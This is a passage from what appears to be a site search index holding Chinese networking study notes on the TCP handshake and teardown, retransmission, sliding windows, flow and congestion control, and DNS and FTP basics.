\u5047\u8BBE A \u4E3A\u5BA2\u6237\u7AEF\uFF0CB \u4E3A\u670D\u52A1\u5668\u7AEF\u3002 \u9996\u5148 B \u5904\u4E8E LISTEN\uFF08\u76D1\u542C\uFF09\u72B6\u6001\uFF0C\u7B49\u5F85\u5BA2\u6237\u7684\u8FDE\u63A5\u8BF7\u6C42\u3002 A \u5411 B \u53D1\u9001\u8FDE\u63A5\u8BF7\u6C42\u62A5\u6587\uFF0CSYN=1\uFF0CACK=0\uFF0C\u9009\u62E9\u4E00\u4E2A\u521D\u59CB\u7684\u5E8F\u53F7 x\u3002 B \u6536\u5230\u8FDE\u63A5\u8BF7\u6C42\u62A5\u6587\uFF0C\u5982\u679C\u540C\u610F\u5EFA\u7ACB\u8FDE\u63A5\uFF0C\u5219\u5411 A \u53D1\u9001\u8FDE\u63A5\u786E\u8BA4\u62A5\u6587\uFF0CSYN=1\uFF0CACK=1\uFF0C\u786E\u8BA4\u53F7\u4E3A x+1\uFF0C\u540C\u65F6\u4E5F\u9009\u62E9\u4E00\u4E2A\u521D\u59CB\u7684\u5E8F\u53F7 y\u3002 A \u6536\u5230 B \u7684\u8FDE\u63A5\u786E\u8BA4\u62A5\u6587\u540E\uFF0C\u8FD8\u8981\u5411 B \u53D1\u51FA\u786E\u8BA4\uFF0C\u786E\u8BA4\u53F7\u4E3A y+1\uFF0C\u5E8F\u53F7\u4E3A x+1\u3002 B \u6536\u5230 A \u7684\u786E\u8BA4\u540E\uFF0C\u8FDE\u63A5\u5EFA\u7ACB\u3002 \u4E09\u6B21\u63E1\u624B\u7684\u539F\u56E0
\u7B2C\u4E09\u6B21\u63E1\u624B\u662F\u4E3A\u4E86\u9632\u6B62\u5931\u6548\u7684\u8FDE\u63A5\u8BF7\u6C42\u5230\u8FBE\u670D\u52A1\u5668\uFF0C\u8BA9\u670D\u52A1\u5668\u9519\u8BEF\u6253\u5F00\u8FDE\u63A5\u3002
\u5BA2\u6237\u7AEF\u53D1\u9001\u7684\u8FDE\u63A5\u8BF7\u6C42\u5982\u679C\u5728\u7F51\u7EDC\u4E2D\u6EDE\u7559\uFF0C\u90A3\u4E48\u5C31\u4F1A\u9694\u5F88\u957F\u4E00\u6BB5\u65F6\u95F4\u624D\u80FD\u6536\u5230\u670D\u52A1\u5668\u7AEF\u53D1\u56DE\u7684\u8FDE\u63A5\u786E\u8BA4\u3002\u5BA2\u6237\u7AEF\u7B49\u5F85\u4E00\u4E2A\u8D85\u65F6\u91CD\u4F20\u65F6\u95F4\u4E4B\u540E\uFF0C\u5C31\u4F1A\u91CD\u65B0\u8BF7\u6C42\u8FDE\u63A5\u3002\u4F46\u662F\u8FD9\u4E2A\u6EDE\u7559\u7684\u8FDE\u63A5\u8BF7\u6C42\u6700\u540E\u8FD8\u662F\u4F1A\u5230\u8FBE\u670D\u52A1\u5668\uFF0C\u5982\u679C\u4E0D\u8FDB\u884C\u4E09\u6B21\u63E1\u624B\uFF0C\u90A3\u4E48\u670D\u52A1\u5668\u5C31\u4F1A\u6253\u5F00\u4E24\u4E2A\u8FDE\u63A5\u3002\u5982\u679C\u6709\u7B2C\u4E09\u6B21\u63E1\u624B\uFF0C\u5BA2\u6237\u7AEF\u4F1A\u5FFD\u7565\u670D\u52A1\u5668\u4E4B\u540E\u53D1\u9001\u7684\u5BF9\u6EDE\u7559\u8FDE\u63A5\u8BF7\u6C42\u7684\u8FDE\u63A5\u786E\u8BA4\uFF0C\u4E0D\u8FDB\u884C\u7B2C\u4E09\u6B21\u63E1\u624B\uFF0C\u56E0\u6B64\u5C31\u4E0D\u4F1A\u518D\u6B21\u6253\u5F00\u8FDE\u63A5\u3002`},{header:"TCP \u7684\u56DB\u6B21\u6325\u624B",slug:"tcp-\u7684\u56DB\u6B21\u6325\u624B",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f87afe72-c2df-4c12-ac03-9b8d581a8af8.jpg" width="600)
\u4EE5\u4E0B\u63CF\u8FF0\u4E0D\u8BA8\u8BBA\u5E8F\u53F7\u548C\u786E\u8BA4\u53F7\uFF0C\u56E0\u4E3A\u5E8F\u53F7\u548C\u786E\u8BA4\u53F7\u7684\u89C4\u5219\u6BD4\u8F83\u7B80\u5355\u3002\u5E76\u4E14\u4E0D\u8BA8\u8BBA ACK\uFF0C\u56E0\u4E3A ACK \u5728\u8FDE\u63A5\u5EFA\u7ACB\u4E4B\u540E\u90FD\u4E3A 1\u3002 A \u53D1\u9001\u8FDE\u63A5\u91CA\u653E\u62A5\u6587\uFF0CFIN=1\u3002 B \u6536\u5230\u4E4B\u540E\u53D1\u51FA\u786E\u8BA4\uFF0C\u6B64\u65F6 TCP \u5C5E\u4E8E\u534A\u5173\u95ED\u72B6\u6001\uFF0CB \u80FD\u5411 A \u53D1\u9001\u6570\u636E\u4F46\u662F A \u4E0D\u80FD\u5411 B \u53D1\u9001\u6570\u636E\u3002 \u5F53 B \u4E0D\u518D\u9700\u8981\u8FDE\u63A5\u65F6\uFF0C\u53D1\u9001\u8FDE\u63A5\u91CA\u653E\u62A5\u6587\uFF0CFIN=1\u3002 A \u6536\u5230\u540E\u53D1\u51FA\u786E\u8BA4\uFF0C\u8FDB\u5165 TIME-WAIT \u72B6\u6001\uFF0C\u7B49\u5F85 2 MSL\uFF08\u6700\u5927\u62A5\u6587\u5B58\u6D3B\u65F6\u95F4\uFF09\u540E\u91CA\u653E\u8FDE\u63A5\u3002 B \u6536\u5230 A \u7684\u786E\u8BA4\u540E\u91CA\u653E\u8FDE\u63A5\u3002 \u56DB\u6B21\u6325\u624B\u7684\u539F\u56E0
\u5BA2\u6237\u7AEF\u53D1\u9001\u4E86 FIN \u8FDE\u63A5\u91CA\u653E\u62A5\u6587\u4E4B\u540E\uFF0C\u670D\u52A1\u5668\u6536\u5230\u4E86\u8FD9\u4E2A\u62A5\u6587\uFF0C\u5C31\u8FDB\u5165\u4E86 CLOSE-WAIT \u72B6\u6001\u3002\u8FD9\u4E2A\u72B6\u6001\u662F\u4E3A\u4E86\u8BA9\u670D\u52A1\u5668\u7AEF\u53D1\u9001\u8FD8\u672A\u4F20\u9001\u5B8C\u6BD5\u7684\u6570\u636E\uFF0C\u4F20\u9001\u5B8C\u6BD5\u4E4B\u540E\uFF0C\u670D\u52A1\u5668\u4F1A\u53D1\u9001 FIN \u8FDE\u63A5\u91CA\u653E\u62A5\u6587\u3002
TIME_WAIT
\u5BA2\u6237\u7AEF\u63A5\u6536\u5230\u670D\u52A1\u5668\u7AEF\u7684 FIN \u62A5\u6587\u540E\u8FDB\u5165\u6B64\u72B6\u6001\uFF0C\u6B64\u65F6\u5E76\u4E0D\u662F\u76F4\u63A5\u8FDB\u5165 CLOSED \u72B6\u6001\uFF0C\u8FD8\u9700\u8981\u7B49\u5F85\u4E00\u4E2A\u65F6\u95F4\u8BA1\u65F6\u5668\u8BBE\u7F6E\u7684\u65F6\u95F4 2MSL\u3002\u8FD9\u4E48\u505A\u6709\u4E24\u4E2A\u7406\u7531\uFF1A \u786E\u4FDD\u6700\u540E\u4E00\u4E2A\u786E\u8BA4\u62A5\u6587\u80FD\u591F\u5230\u8FBE\u3002\u5982\u679C B \u6CA1\u6536\u5230 A \u53D1\u9001\u6765\u7684\u786E\u8BA4\u62A5\u6587\uFF0C\u90A3\u4E48\u5C31\u4F1A\u91CD\u65B0\u53D1\u9001\u8FDE\u63A5\u91CA\u653E\u8BF7\u6C42\u62A5\u6587\uFF0CA \u7B49\u5F85\u4E00\u6BB5\u65F6\u95F4\u5C31\u662F\u4E3A\u4E86\u5904\u7406\u8FD9\u79CD\u60C5\u51B5\u7684\u53D1\u751F\u3002 \u7B49\u5F85\u4E00\u6BB5\u65F6\u95F4\u662F\u4E3A\u4E86\u8BA9\u672C\u8FDE\u63A5\u6301\u7EED\u65F6\u95F4\u5185\u6240\u4EA7\u751F\u7684\u6240\u6709\u62A5\u6587\u90FD\u4ECE\u7F51\u7EDC\u4E2D\u6D88\u5931\uFF0C\u4F7F\u5F97\u4E0B\u4E00\u4E2A\u65B0\u7684\u8FDE\u63A5\u4E0D\u4F1A\u51FA\u73B0\u65E7\u7684\u8FDE\u63A5\u8BF7\u6C42\u62A5\u6587\u3002`},{header:"TCP \u53EF\u9760\u4F20\u8F93",slug:"tcp-\u53EF\u9760\u4F20\u8F93",content:`TCP \u4F7F\u7528\u8D85\u65F6\u91CD\u4F20\u6765\u5B9E\u73B0\u53EF\u9760\u4F20\u8F93\uFF1A\u5982\u679C\u4E00\u4E2A\u5DF2\u7ECF\u53D1\u9001\u7684\u62A5\u6587\u6BB5\u5728\u8D85\u65F6\u65F6\u95F4\u5185\u6CA1\u6709\u6536\u5230\u786E\u8BA4\uFF0C\u90A3\u4E48\u5C31\u91CD\u4F20\u8FD9\u4E2A\u62A5\u6587\u6BB5\u3002
\u4E00\u4E2A\u62A5\u6587\u6BB5\u4ECE\u53D1\u9001\u518D\u5230\u63A5\u6536\u5230\u786E\u8BA4\u6240\u7ECF\u8FC7\u7684\u65F6\u95F4\u79F0\u4E3A\u5F80\u8FD4\u65F6\u95F4 RTT\uFF0C\u52A0\u6743\u5E73\u5747\u5F80\u8FD4\u65F6\u95F4 RTTs \u8BA1\u7B97\u5982\u4E0B\uFF1A
![img](https://latex.codecogs.com/gif.latex?RTTs=(1-a)(RTTs)+aRTT" class="mathjax-pic)
\u5176\u4E2D\uFF0C0 \u2264 a \uFF1C 1\uFF0CRTTs \u968F\u7740 a \u7684\u589E\u52A0\u66F4\u5BB9\u6613\u53D7\u5230 RTT \u7684\u5F71\u54CD\u3002
\u8D85\u65F6\u65F6\u95F4 RTO \u5E94\u8BE5\u7565\u5927\u4E8E RTTs\uFF0CTCP \u4F7F\u7528\u7684\u8D85\u65F6\u65F6\u95F4\u8BA1\u7B97\u5982\u4E0B\uFF1A
![img](https://latex.codecogs.com/gif.latex?RTO=RTTs+4*RTT_d" class="mathjax-pic)
\u5176\u4E2D RTTd \u4E3A\u504F\u5DEE\u7684\u52A0\u6743\u5E73\u5747\u503C\u3002`},{header:"TCP \u6ED1\u52A8\u7A97\u53E3",slug:"tcp-\u6ED1\u52A8\u7A97\u53E3",content:`\u7A97\u53E3\u662F\u7F13\u5B58\u7684\u4E00\u90E8\u5206\uFF0C\u7528\u6765\u6682\u65F6\u5B58\u653E\u5B57\u8282\u6D41\u3002\u53D1\u9001\u65B9\u548C\u63A5\u6536\u65B9\u5404\u6709\u4E00\u4E2A\u7A97\u53E3\uFF0C\u63A5\u6536\u65B9\u901A\u8FC7 TCP \u62A5\u6587\u6BB5\u4E2D\u7684\u7A97\u53E3\u5B57\u6BB5\u544A\u8BC9\u53D1\u9001\u65B9\u81EA\u5DF1\u7684\u7A97\u53E3\u5927\u5C0F\uFF0C\u53D1\u9001\u65B9\u6839\u636E\u8FD9\u4E2A\u503C\u548C\u5176\u5B83\u4FE1\u606F\u8BBE\u7F6E\u81EA\u5DF1\u7684\u7A97\u53E3\u5927\u5C0F\u3002
\u53D1\u9001\u7A97\u53E3\u5185\u7684\u5B57\u8282\u90FD\u5141\u8BB8\u88AB\u53D1\u9001\uFF0C\u63A5\u6536\u7A97\u53E3\u5185\u7684\u5B57\u8282\u90FD\u5141\u8BB8\u88AB\u63A5\u6536\u3002\u5982\u679C\u53D1\u9001\u7A97\u53E3\u5DE6\u90E8\u7684\u5B57\u8282\u5DF2\u7ECF\u53D1\u9001\u5E76\u4E14\u6536\u5230\u4E86\u786E\u8BA4\uFF0C\u90A3\u4E48\u5C31\u5C06\u53D1\u9001\u7A97\u53E3\u5411\u53F3\u6ED1\u52A8\u4E00\u5B9A\u8DDD\u79BB\uFF0C\u76F4\u5230\u5DE6\u90E8\u7B2C\u4E00\u4E2A\u5B57\u8282\u4E0D\u662F\u5DF2\u53D1\u9001\u5E76\u4E14\u5DF2\u786E\u8BA4\u7684\u72B6\u6001\uFF1B\u63A5\u6536\u7A97\u53E3\u7684\u6ED1\u52A8\u7C7B\u4F3C\uFF0C\u63A5\u6536\u7A97\u53E3\u5DE6\u90E8\u5B57\u8282\u5DF2\u7ECF\u53D1\u9001\u786E\u8BA4\u5E76\u4EA4\u4ED8\u4E3B\u673A\uFF0C\u5C31\u5411\u53F3\u6ED1\u52A8\u63A5\u6536\u7A97\u53E3\u3002
\u63A5\u6536\u7A97\u53E3\u53EA\u4F1A\u5BF9\u7A97\u53E3\u5185\u6700\u540E\u4E00\u4E2A\u6309\u5E8F\u5230\u8FBE\u7684\u5B57\u8282\u8FDB\u884C\u786E\u8BA4\uFF0C\u4F8B\u5982\u63A5\u6536\u7A97\u53E3\u5DF2\u7ECF\u6536\u5230\u7684\u5B57\u8282\u4E3A {31, 34, 35}\uFF0C\u5176\u4E2D {31} \u6309\u5E8F\u5230\u8FBE\uFF0C\u800C {34, 35} \u5C31\u4E0D\u662F\uFF0C\u56E0\u6B64\u53EA\u5BF9\u5B57\u8282 31 \u8FDB\u884C\u786E\u8BA4\u3002\u53D1\u9001\u65B9\u5F97\u5230\u4E00\u4E2A\u5B57\u8282\u7684\u786E\u8BA4\u4E4B\u540E\uFF0C\u5C31\u77E5\u9053\u8FD9\u4E2A\u5B57\u8282\u4E4B\u524D\u7684\u6240\u6709\u5B57\u8282\u90FD\u5DF2\u7ECF\u88AB\u63A5\u6536\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a3253deb-8d21-40a1-aae4-7d178e4aa319.jpg" width="800)`},{header:"TCP \u6D41\u91CF\u63A7\u5236",slug:"tcp-\u6D41\u91CF\u63A7\u5236",content:`\u6D41\u91CF\u63A7\u5236\u662F\u4E3A\u4E86\u63A7\u5236\u53D1\u9001\u65B9\u53D1\u9001\u901F\u7387\uFF0C\u4FDD\u8BC1\u63A5\u6536\u65B9\u6765\u5F97\u53CA\u63A5\u6536\u3002
\u63A5\u6536\u65B9\u53D1\u9001\u7684\u786E\u8BA4\u62A5\u6587\u4E2D\u7684\u7A97\u53E3\u5B57\u6BB5\u53EF\u4EE5\u7528\u6765\u63A7\u5236\u53D1\u9001\u65B9\u7A97\u53E3\u5927\u5C0F\uFF0C\u4ECE\u800C\u5F71\u54CD\u53D1\u9001\u65B9\u7684\u53D1\u9001\u901F\u7387\u3002\u5C06\u7A97\u53E3\u5B57\u6BB5\u8BBE\u7F6E\u4E3A 0\uFF0C\u5219\u53D1\u9001\u65B9\u4E0D\u80FD\u53D1\u9001\u6570\u636E\u3002`},{header:"TCP \u62E5\u585E\u63A7\u5236",slug:"tcp-\u62E5\u585E\u63A7\u5236",content:`\u5982\u679C\u7F51\u7EDC\u51FA\u73B0\u62E5\u585E\uFF0C\u5206\u7EC4\u5C06\u4F1A\u4E22\u5931\uFF0C\u6B64\u65F6\u53D1\u9001\u65B9\u4F1A\u7EE7\u7EED\u91CD\u4F20\uFF0C\u4ECE\u800C\u5BFC\u81F4\u7F51\u7EDC\u62E5\u585E\u7A0B\u5EA6\u66F4\u9AD8\u3002\u56E0\u6B64\u5F53\u51FA\u73B0\u62E5\u585E\u65F6\uFF0C\u5E94\u5F53\u63A7\u5236\u53D1\u9001\u65B9\u7684\u901F\u7387\u3002\u8FD9\u4E00\u70B9\u548C\u6D41\u91CF\u63A7\u5236\u5F88\u50CF\uFF0C\u4F46\u662F\u51FA\u53D1\u70B9\u4E0D\u540C\u3002\u6D41\u91CF\u63A7\u5236\u662F\u4E3A\u4E86\u8BA9\u63A5\u6536\u65B9\u80FD\u6765\u5F97\u53CA\u63A5\u6536\uFF0C\u800C\u62E5\u585E\u63A7\u5236\u662F\u4E3A\u4E86\u964D\u4F4E\u6574\u4E2A\u7F51\u7EDC\u7684\u62E5\u585E\u7A0B\u5EA6\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/51e2ed95-65b8-4ae9-8af3-65602d452a25.jpg" width="500)
TCP \u4E3B\u8981\u901A\u8FC7\u56DB\u4E2A\u7B97\u6CD5\u6765\u8FDB\u884C\u62E5\u585E\u63A7\u5236\uFF1A\u6162\u5F00\u59CB\u3001\u62E5\u585E\u907F\u514D\u3001\u5FEB\u91CD\u4F20\u3001\u5FEB\u6062\u590D\u3002
\u53D1\u9001\u65B9\u9700\u8981\u7EF4\u62A4\u4E00\u4E2A\u53EB\u505A\u62E5\u585E\u7A97\u53E3\uFF08cwnd\uFF09\u7684\u72B6\u6001\u53D8\u91CF\uFF0C\u6CE8\u610F\u62E5\u585E\u7A97\u53E3\u4E0E\u53D1\u9001\u65B9\u7A97\u53E3\u7684\u533A\u522B\uFF1A\u62E5\u585E\u7A97\u53E3\u53EA\u662F\u4E00\u4E2A\u72B6\u6001\u53D8\u91CF\uFF0C\u5B9E\u9645\u51B3\u5B9A\u53D1\u9001\u65B9\u80FD\u53D1\u9001\u591A\u5C11\u6570\u636E\u7684\u662F\u53D1\u9001\u65B9\u7A97\u53E3\u3002
\u4E3A\u4E86\u4FBF\u4E8E\u8BA8\u8BBA\uFF0C\u505A\u5982\u4E0B\u5047\u8BBE\uFF1A \u63A5\u6536\u65B9\u6709\u8DB3\u591F\u5927\u7684\u63A5\u6536\u7F13\u5B58\uFF0C\u56E0\u6B64\u4E0D\u4F1A\u53D1\u751F\u6D41\u91CF\u63A7\u5236\uFF1B
\u867D\u7136 TCP \u7684\u7A97\u53E3\u57FA\u4E8E\u5B57\u8282\uFF0C\u4F46\u662F\u8FD9\u91CC\u8BBE\u7A97\u53E3\u7684\u5927\u5C0F\u5355\u4F4D\u4E3A\u62A5\u6587\u6BB5\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/910f613f-514f-4534-87dd-9b4699d59d31.png" width="800)`},{header:"1. \u6162\u5F00\u59CB\u4E0E\u62E5\u585E\u907F\u514D",slug:"_1-\u6162\u5F00\u59CB\u4E0E\u62E5\u585E\u907F\u514D",content:`\u53D1\u9001\u7684\u6700\u521D\u6267\u884C\u6162\u5F00\u59CB\uFF0C\u4EE4 cwnd = 1\uFF0C\u53D1\u9001\u65B9\u53EA\u80FD\u53D1\u9001 1 \u4E2A\u62A5\u6587\u6BB5\uFF1B\u5F53\u6536\u5230\u786E\u8BA4\u540E\uFF0C\u5C06 cwnd \u52A0\u500D\uFF0C\u56E0\u6B64\u4E4B\u540E\u53D1\u9001\u65B9\u80FD\u591F\u53D1\u9001\u7684\u62A5\u6587\u6BB5\u6570\u91CF\u4E3A\uFF1A2\u30014\u30018 ...
\u6CE8\u610F\u5230\u6162\u5F00\u59CB\u6BCF\u4E2A\u8F6E\u6B21\u90FD\u5C06 cwnd \u52A0\u500D\uFF0C\u8FD9\u6837\u4F1A\u8BA9 cwnd \u589E\u957F\u901F\u5EA6\u975E\u5E38\u5FEB\uFF0C\u4ECE\u800C\u4F7F\u5F97\u53D1\u9001\u65B9\u53D1\u9001\u7684\u901F\u5EA6\u589E\u957F\u901F\u5EA6\u8FC7\u5FEB\uFF0C\u7F51\u7EDC\u62E5\u585E\u7684\u53EF\u80FD\u6027\u4E5F\u5C31\u66F4\u9AD8\u3002\u8BBE\u7F6E\u4E00\u4E2A\u6162\u5F00\u59CB\u95E8\u9650 ssthresh\uFF0C\u5F53 cwnd >= ssthresh \u65F6\uFF0C\u8FDB\u5165\u62E5\u585E\u907F\u514D\uFF0C\u6BCF\u4E2A\u8F6E\u6B21\u53EA\u5C06 cwnd \u52A0 1\u3002
\u5982\u679C\u51FA\u73B0\u4E86\u8D85\u65F6\uFF0C\u5219\u4EE4 ssthresh = cwnd / 2\uFF0C\u7136\u540E\u91CD\u65B0\u6267\u884C\u6162\u5F00\u59CB\u3002`},{header:"2. \u5FEB\u91CD\u4F20\u4E0E\u5FEB\u6062\u590D",slug:"_2-\u5FEB\u91CD\u4F20\u4E0E\u5FEB\u6062\u590D",content:`\u5728\u63A5\u6536\u65B9\uFF0C\u8981\u6C42\u6BCF\u6B21\u63A5\u6536\u5230\u62A5\u6587\u6BB5\u90FD\u5E94\u8BE5\u5BF9\u6700\u540E\u4E00\u4E2A\u5DF2\u6536\u5230\u7684\u6709\u5E8F\u62A5\u6587\u6BB5\u8FDB\u884C\u786E\u8BA4\u3002\u4F8B\u5982\u5DF2\u7ECF\u63A5\u6536\u5230 M1 \u548C M2\uFF0C\u6B64\u65F6\u6536\u5230 M4\uFF0C\u5E94\u5F53\u53D1\u9001\u5BF9 M2 \u7684\u786E\u8BA4\u3002
\u5728\u53D1\u9001\u65B9\uFF0C\u5982\u679C\u6536\u5230\u4E09\u4E2A\u91CD\u590D\u786E\u8BA4\uFF0C\u90A3\u4E48\u53EF\u4EE5\u77E5\u9053\u4E0B\u4E00\u4E2A\u62A5\u6587\u6BB5\u4E22\u5931\uFF0C\u6B64\u65F6\u6267\u884C\u5FEB\u91CD\u4F20\uFF0C\u7ACB\u5373\u91CD\u4F20\u4E0B\u4E00\u4E2A\u62A5\u6587\u6BB5\u3002\u4F8B\u5982\u6536\u5230\u4E09\u4E2A M2\uFF0C\u5219 M3 \u4E22\u5931\uFF0C\u7ACB\u5373\u91CD\u4F20 M3\u3002
\u5728\u8FD9\u79CD\u60C5\u51B5\u4E0B\uFF0C\u53EA\u662F\u4E22\u5931\u4E2A\u522B\u62A5\u6587\u6BB5\uFF0C\u800C\u4E0D\u662F\u7F51\u7EDC\u62E5\u585E\u3002\u56E0\u6B64\u6267\u884C\u5FEB\u6062\u590D\uFF0C\u4EE4 ssthresh = cwnd / 2 \uFF0Ccwnd = ssthresh\uFF0C\u6CE8\u610F\u5230\u6B64\u65F6\u76F4\u63A5\u8FDB\u5165\u62E5\u585E\u907F\u514D\u3002
\u6162\u5F00\u59CB\u548C\u5FEB\u6062\u590D\u7684\u5FEB\u6162\u6307\u7684\u662F cwnd \u7684\u8BBE\u5B9A\u503C\uFF0C\u800C\u4E0D\u662F cwnd \u7684\u589E\u957F\u901F\u7387\u3002\u6162\u5F00\u59CB cwnd \u8BBE\u5B9A\u4E3A 1\uFF0C\u800C\u5FEB\u6062\u590D cwnd \u8BBE\u5B9A\u4E3A ssthresh\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f61b5419-c94a-4df1-8d4d-aed9ae8cc6d5.png" width="600)`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E5%BA%94%E7%94%A8%E5%B1%82.html",title:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u5E94\u7528\u5C42",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u5E94\u7528\u5C42",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC-\u5E94\u7528\u5C42",content:`\u8BA1\u7B97\u673A\u7F51\u7EDC - \u5E94\u7528\u5C42 \u57DF\u540D\u7CFB\u7EDF
\u6587\u4EF6\u4F20\u9001\u534F\u8BAE
\u52A8\u6001\u4E3B\u673A\u914D\u7F6E\u534F\u8BAE
\u8FDC\u7A0B\u767B\u5F55\u534F\u8BAE
\u7535\u5B50\u90AE\u4EF6\u534F\u8BAE 1. SMTP
2. POP3
3. IMAP \u5E38\u7528\u7AEF\u53E3
Web \u9875\u9762\u8BF7\u6C42\u8FC7\u7A0B 1. DHCP \u914D\u7F6E\u4E3B\u673A\u4FE1\u606F
2. ARP \u89E3\u6790 MAC \u5730\u5740
3. DNS \u89E3\u6790\u57DF\u540D
4. HTTP \u8BF7\u6C42\u9875\u9762`},{header:"\u57DF\u540D\u7CFB\u7EDF",slug:"\u57DF\u540D\u7CFB\u7EDF",content:`DNS \u662F\u4E00\u4E2A\u5206\u5E03\u5F0F\u6570\u636E\u5E93\uFF0C\u63D0\u4F9B\u4E86\u4E3B\u673A\u540D\u548C IP \u5730\u5740\u4E4B\u95F4\u76F8\u4E92\u8F6C\u6362\u7684\u670D\u52A1\u3002\u8FD9\u91CC\u7684\u5206\u5E03\u5F0F\u6570\u636E\u5E93\u662F\u6307\uFF0C\u6BCF\u4E2A\u7AD9\u70B9\u53EA\u4FDD\u7559\u5B83\u81EA\u5DF1\u7684\u90A3\u90E8\u5206\u6570\u636E\u3002
\u57DF\u540D\u5177\u6709\u5C42\u6B21\u7ED3\u6784\uFF0C\u4ECE\u4E0A\u5230\u4E0B\u4F9D\u6B21\u4E3A\uFF1A\u6839\u57DF\u540D\u3001\u9876\u7EA7\u57DF\u540D\u3001\u4E8C\u7EA7\u57DF\u540D\u3002 DNS \u53EF\u4EE5\u4F7F\u7528 UDP \u6216\u8005 TCP \u8FDB\u884C\u4F20\u8F93\uFF0C\u4F7F\u7528\u7684\u7AEF\u53E3\u53F7\u90FD\u4E3A 53\u3002\u5927\u591A\u6570\u60C5\u51B5\u4E0B DNS \u4F7F\u7528 UDP \u8FDB\u884C\u4F20\u8F93\uFF0C\u8FD9\u5C31\u8981\u6C42\u57DF\u540D\u89E3\u6790\u5668\u548C\u57DF\u540D\u670D\u52A1\u5668\u90FD\u5FC5\u987B\u81EA\u5DF1\u5904\u7406\u8D85\u65F6\u548C\u91CD\u4F20\u4ECE\u800C\u4FDD\u8BC1\u53EF\u9760\u6027\u3002\u5728\u4E24\u79CD\u60C5\u51B5\u4E0B\u4F1A\u4F7F\u7528 TCP \u8FDB\u884C\u4F20\u8F93\uFF1A \u5982\u679C\u8FD4\u56DE\u7684\u54CD\u5E94\u8D85\u8FC7\u7684 512 \u5B57\u8282\uFF08UDP \u6700\u5927\u53EA\u652F\u6301 512 \u5B57\u8282\u7684\u6570\u636E\uFF09\u3002
\u533A\u57DF\u4F20\u9001\uFF08\u533A\u57DF\u4F20\u9001\u662F\u4E3B\u57DF\u540D\u670D\u52A1\u5668\u5411\u8F85\u52A9\u57DF\u540D\u670D\u52A1\u5668\u4F20\u9001\u53D8\u5316\u7684\u90A3\u90E8\u5206\u6570\u636E\uFF09\u3002`},{header:"\u6587\u4EF6\u4F20\u9001\u534F\u8BAE",slug:"\u6587\u4EF6\u4F20\u9001\u534F\u8BAE",content:`FTP \u4F7F\u7528 TCP \u8FDB\u884C\u8FDE\u63A5\uFF0C\u5B83\u9700\u8981\u4E24\u4E2A\u8FDE\u63A5\u6765\u4F20\u9001\u4E00\u4E2A\u6587\u4EF6\uFF1A \u63A7\u5236\u8FDE\u63A5\uFF1A\u670D\u52A1\u5668\u6253\u5F00\u7AEF\u53E3\u53F7 21 \u7B49\u5F85\u5BA2\u6237\u7AEF\u7684\u8FDE\u63A5\uFF0C\u5BA2\u6237\u7AEF\u4E3B\u52A8\u5EFA\u7ACB\u8FDE\u63A5\u540E\uFF0C\u4F7F\u7528\u8FD9\u4E2A\u8FDE\u63A5\u5C06\u5BA2\u6237\u7AEF\u7684\u547D\u4EE4\u4F20\u9001\u7ED9\u670D\u52A1\u5668\uFF0C\u5E76\u4F20\u56DE\u670D\u52A1\u5668\u7684\u5E94\u7B54\u3002
\u6570\u636E\u8FDE\u63A5\uFF1A\u7528\u6765\u4F20\u9001\u4E00\u4E2A\u6587\u4EF6\u6570\u636E\u3002 \u6839\u636E\u6570\u636E\u8FDE\u63A5\u662F\u5426\u662F\u670D\u52A1\u5668\u7AEF\u4E3B\u52A8\u5EFA\u7ACB\uFF0CFTP \u6709\u4E3B\u52A8\u548C\u88AB\u52A8\u4E24\u79CD\u6A21\u5F0F\uFF1A \u4E3B\u52A8\u6A21\u5F0F\uFF1A\u670D\u52A1\u5668\u7AEF\u4E3B\u52A8\u5EFA\u7ACB\u6570\u636E\u8FDE\u63A5\uFF0C\u5176\u4E2D\u670D\u52A1\u5668\u7AEF\u7684\u7AEF\u53E3\u53F7\u4E3A 20\uFF0C\u5BA2\u6237\u7AEF\u7684\u7AEF\u53E3\u53F7\u968F\u673A\uFF0C\u4F46\u662F\u5FC5\u987B\u5927\u4E8E 1024\uFF0C\u56E0\u4E3A 0~1023 \u662F\u719F\u77E5\u7AEF\u53E3\u53F7\u3002 \u88AB\u52A8\u6A21\u5F0F\uFF1A\u5BA2\u6237\u7AEF\u4E3B\u52A8\u5EFA\u7ACB\u6570\u636E\u8FDE\u63A5\uFF0C\u5176\u4E2D\u5BA2\u6237\u7AEF\u7684\u7AEF\u53E3\u53F7\u7531\u5BA2\u6237\u7AEF\u81EA\u5DF1\u6307\u5B9A\uFF0C\u670D\u52A1\u5668\u7AEF\u7684\u7AEF\u53E3\u53F7\u968F\u673A\u3002 \u4E3B\u52A8\u6A21\u5F0F\u8981\u6C42\u5BA2\u6237\u7AEF\u5F00\u653E\u7AEF\u53E3\u53F7\u7ED9\u670D\u52A1\u5668\u7AEF\uFF0C\u9700\u8981\u53BB\u914D\u7F6E\u5BA2\u6237\u7AEF\u7684\u9632\u706B\u5899\u3002\u88AB\u52A8\u6A21\u5F0F\u53EA\u9700\u8981\u670D\u52A1\u5668\u7AEF\u5F00\u653E\u7AEF\u53E3\u53F7\u5373\u53EF\uFF0C\u65E0\u9700\u5BA2\u6237\u7AEF\u914D\u7F6E\u9632\u706B\u5899\u3002\u4F46\u662F\u88AB\u52A8\u6A21\u5F0F\u4F1A\u5BFC\u81F4\u670D\u52A1\u5668\u7AEF\u7684\u5B89\u5168\u6027\u51CF\u5F31\uFF0C\u56E0\u4E3A\u5F00\u653E\u4E86\u8FC7\u591A\u7684\u7AEF\u53E3\u53F7\u3002`},{header:"\u52A8\u6001\u4E3B\u673A\u914D\u7F6E\u534F\u8BAE",slug:"\u52A8\u6001\u4E3B\u673A\u914D\u7F6E\u534F\u8BAE",content:`DHCP (Dynamic Host Configuration Protocol) 